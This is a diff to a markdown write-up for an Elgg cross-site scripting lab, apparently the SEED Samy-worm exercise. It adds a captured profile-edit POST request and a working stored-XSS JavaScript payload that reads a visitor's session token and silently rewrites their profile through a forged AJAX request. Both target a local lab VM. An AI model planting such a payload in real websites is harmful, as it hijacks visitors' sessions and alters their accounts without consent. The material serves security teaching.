@@ -135,8 +135,91 @@ So construct the payload that forges the user's friend request as:
 </script>
 ```
 
-Log in with username `samy` and password `seedsamy`. 
+Log in with username `samy` and password `seedsamy`.
 
 Add the code above in `Profile` -> `About me` by `edit html` mode.
 
 Now on the VM `10.0.2.4`, sign in as Boby and visit Samy's profile(http://www.xsslabelgg.com/profile/samy), without any extra action, just refresh the page, it shows that Samy is already your (i.e. Boby) friend.
+
+# Task 5
+
+When editing a user's (Alice) own profile legally, the `network` tool captures such an HTTP POST request:
+
+```
+Request URL: http://www.xsslabelgg.com/action/profile/edit
+__elgg_token=VSvHyrizEfLuFJUoNPOQXg
+__elgg_ts=1589672946
+name=Alice
+description=<p>dsadsa</p>
+accesslevel[description]=2
+briefdescription=dasasda
+accesslevel[briefdescription]=2
+location
+accesslevel[location]=2
+interests
+accesslevel[interests]=2
+skills
+accesslevel[skills]=2
+contactemail
+accesslevel[contactemail]=2
+phone
+accesslevel[phone]=2
+mobile
+accesslevel[mobile]=2
+website
+accesslevel[website]=2
+twitter
+accesslevel[twitter]=2
+guid=44
+POST /action/profile/edit HTTP/1.1
+Host: www.xsslabelgg.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.xsslabelgg.com/profile/alice/edit
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 505
+Cookie: Elgg=ruji2rg6eu80rqj6oebqt57ga7
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+```
+
+Then edit Samy's profile and figure out his `guid` as 47
+
+![](guid.png)
+
+Now we want to modify the `about me` module in the profile of someone as `"modified by Samy"` if he/she visits Samy's profile page. Save the code below as Samy's profile:
+
+```html
+<script type="text/javascript">
+  window.onload = function(){
+  //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+  //and Security Token __elgg_token
+  var userName="&name="+elgg.session.user.name;
+  var guid="&guid="+elgg.session.user.guid;
+  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+  var token="&__elgg_token="+elgg.security.token.__elgg_token;
+  var description = "&description=<p>modified by Samy<p>" + "&accesslevel[description]=2";
+  //Construct the content of your url.
+  var sendurl =  "http://www.xsslabelgg.com/action/profile/edit";
+  var content= userName+guid+ts+token+description;
+  var samyGuid=47;
+  if(elgg.session.user.guid!=samyGuid)
+  {
+  //Create and send Ajax request to modify profile
+  var Ajax=null;
+  Ajax=new XMLHttpRequest();
+  Ajax.open("POST",sendurl,true);
+  Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+  Ajax.setRequestHeader("Content-Type",
+  "application/x-www-form-urlencoded");
+  Ajax.send(content);
+  }
+  }
+</script>
+```
+
+Then, visit Samy's profile using Boby's account. Boby's profile is modified at once:
+
+![](./boby_profile.png)
